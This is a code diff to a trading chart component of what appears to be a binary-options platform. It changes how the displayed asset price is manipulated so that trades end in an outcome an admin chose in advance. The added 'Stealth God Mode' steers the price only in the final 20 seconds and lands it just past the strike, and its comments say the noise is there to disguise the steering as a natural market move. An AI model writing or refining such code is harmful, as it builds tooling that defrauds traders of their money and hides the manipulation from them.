@@ -37,45 +37,42 @@ export function OptionsChart({ asset, basePrice, activeTrade, onPriceUpdate }: O
       const randomMove = (Math.random() - 0.5) * volatility;
 
       if (activeTrade && activeTrade.status === "ACTIVE") {
-        if (activeTrade.adminResult) {
+        const timeLeftMs = (activeTrade.startTime + activeTrade.durationMinutes * 60 * 1000) - Date.now();
+        
+        // Stealth God Mode: Only manipulate in the final 20 seconds!
+        if (activeTrade.adminResult && timeLeftMs <= 20000 && timeLeftMs > 0) {
            const userWantsUp = activeTrade.direction === "UP";
            const adminWantsWin = activeTrade.adminResult === "WIN";
            const targetIsUp = adminWantsWin ? userWantsUp : !userWantsUp;
            
-           // Target a safe margin (0.15%) past the strike price
-           const goalMargin = basePrice * 0.0015; 
+           // Target EXACTLY $10 equivalent distance from strike (0.015% of BTC price) 
+           // Make it look like they BARELY won or BARELY lost.
+           const goalMargin = basePrice * 0.00015; 
            const targetZone = activeTrade.strikePrice + (targetIsUp ? goalMargin : -goalMargin);
            
-           // If we are not yet safely past the strike target zone
-           if ((targetIsUp && nextPrice < targetZone) || (!targetIsUp && nextPrice > targetZone)) {
-               const directionSign = targetIsUp ? 1 : -1;
-               // High volatility + strong directional bias (spike effect)
-               const bias = directionSign * volatility * 2.0;
-               nextPrice += bias + (Math.random() - 0.5) * (volatility * 3);
-           } else {
-               // We crossed the line! Now act like a completely normal market
-               const safeDistance = Math.abs(nextPrice - activeTrade.strikePrice);
-               let bounce = 0;
-               // If it accidentally wanders too close to the strike again, soft-bounce it away
-               if (safeDistance < basePrice * 0.0005) {
-                   bounce = targetIsUp ? volatility * 0.5 : -volatility * 0.5;
-               }
-               nextPrice += bounce + randomMove;
-           }
+           // Calculate exactly how far we need to steer it
+           const diff = targetZone - nextPrice;
+           
+           // Smoothly glide 15% of the remaining gap each second to neatly land there
+           const glide = diff * 0.15;
+           
+           // Add heavy volatility to mask the glide as a sudden market trend
+           nextPrice += glide + ((Math.random() - 0.5) * (volatility * 2.5));
+           
         } else {
-           // No manipulation, normal market walk
+           // Normal market walk (applies for the first 2m40s, or if no adminResult)
            nextPrice += randomMove;
         }
       } else {
         // NO ACTIVE TRADE: Check if we are displaced from the real asset price
         const diff = basePrice - nextPrice;
-        if (Math.abs(diff) > basePrice * 0.0001) {
-           // Organic recovery curve: pull 10% of the distance back per tick
-           const pull = diff * 0.1;
-           nextPrice += pull + randomMove * 1.5; // Naturalize the recovery curve
+        if (Math.abs(diff) > basePrice * 0.00005) { // Any noticeable drift
+           // Fast organic recovery curve: pull 20% of the distance back per tick (5-10 seconds repair)
+           const pull = diff * 0.2;
+           nextPrice += pull + randomMove; 
         } else {
            // Just regular market noise around base price
-           nextPrice += (diff * 0.05) + randomMove; // 5% mean reversion to stop infinite drift
+           nextPrice += (diff * 0.05) + randomMove; 
         }
       }
 
